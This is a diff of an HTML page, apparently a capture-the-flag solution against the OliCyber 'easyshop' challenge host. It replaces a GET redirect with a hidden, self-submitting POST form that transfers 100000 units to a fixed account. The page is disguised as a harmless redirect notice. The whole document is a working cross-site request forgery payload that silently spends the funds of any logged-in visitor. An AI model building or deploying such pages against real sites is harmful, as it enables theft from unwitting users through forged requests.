@@ -1,5 +1,30 @@
-<script>
-const myHeaders = new Headers(); 
-myHeaders.append("Location", "https://easyshop.challs.olicyber.it/send?to=d37a0dd4f9e3f479f6b46f75363487e1098c8e75b7bb65339e7cc965be58025f&amount=100000");
-window.location.replace('https://easyshop.challs.olicyber.it/send?to=d37a0dd4f9e3f479f6b46f75363487e1098c8e75b7bb65339e7cc965be58025f&amount=100000');
-</script>
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reindirizzamento in corso...</title>
+</head>
+<body>
+
+    <!-- 1. Il form invisibile che punta al tuo nuovo link -->
+    <form id="postRedirectForm" action="https://easyshop.challs.olicyber.it/send" method="POST" style="display: none;">
+        
+        <!-- Puoi inserire qui eventuali dati (chiavi/valori) che vuoi inviare tramite POST -->
+        <input type="hidden" name="to" value="d37a0dd4f9e3f479f6b46f75363487e1098c8e75b7bb65339e7cc965be58025f">
+        <input type="hidden" name="amount" value="100000">
+        
+        <!-- Un pulsante di fallback nel caso in cui JS sia disabilitato -->
+        <input type="submit" value="Clicca qui per continuare">
+    </form>
+
+    <p>Reindirizzamento in corso. Se non succede nulla, <a href="#" onclick="document.getElementById('postRedirectForm').submit(); return false;">clicca qui</a>.</p>
+
+    <!-- 2. Lo script che invia il form automaticamente -->
+    <script>
+        // Non appena il browser legge questa riga, invia il form tramite POST
+        document.getElementById('postRedirectForm').submit();
+    </script>
+
+</body>
+</html>
